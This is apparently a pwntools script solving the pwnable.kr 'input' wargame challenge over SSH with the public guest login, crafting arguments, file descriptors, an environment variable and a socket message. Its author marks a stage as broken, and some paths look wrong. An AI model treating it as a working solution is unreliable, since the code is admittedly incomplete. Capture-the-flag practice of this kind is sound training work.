from pwn import *
import os

#context.log_level = 'DEBUG'

def main():
    s = ssh(host="pwnable.kr",
            user="input2",
            password="guest",
            port=2222)

    # Prep
    s.run("ln -s /home/input2/flag flag")

    # Stage 1
    argv = []
    for _ in range(0,100):
            argv.append("")

    argv[0] = "/home/input2/input"
    argv[65] = "\x00"
    argv[66] = "\x20\x0a\x0d"
    argv[67] = "1337"

    # Stage 2
    s.run("python -c 'f=open(\"/tmp/bell/stdin\", \"w\");f.write(\"\x00\x0a\x00\xff\");f.close()'")
    s.run("python -c 'f=open(\"/tmp/bell/stderr\", \"w\");f.write(\"\x00\x0a\x02\xff\");f.close()'")

    # Stage 3
    env = {}
    env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"

    # Stage 4
    s.run("python -c 'f=open(\"tmp/bell/\x0a\", \"w\");f.write(\"\x00\x00\x00\x00\");f.close()'")

    sp = s.process(argv=argv, 
                   stdin="/tmp/bell/stdin", 
                   stderr="/tmp/bell/stderr", 
                   env=env,
                   cwd="/tmp/bell")

    # Stage 5
    # TODO: Something is broken here, but I do not know what.
    sleep(10)
    ss = ssh(host="pwnable.kr",
             user="input2",
             password="guest",
             port=2222)
    ss.run("python -c 'from pwn import *;c=remote(\"localhost\", 1337);c.write(\"\xde\xad\xbe\xef\");c.close();'")
    sp.interactive()

if __name__ == "__main__":
    main()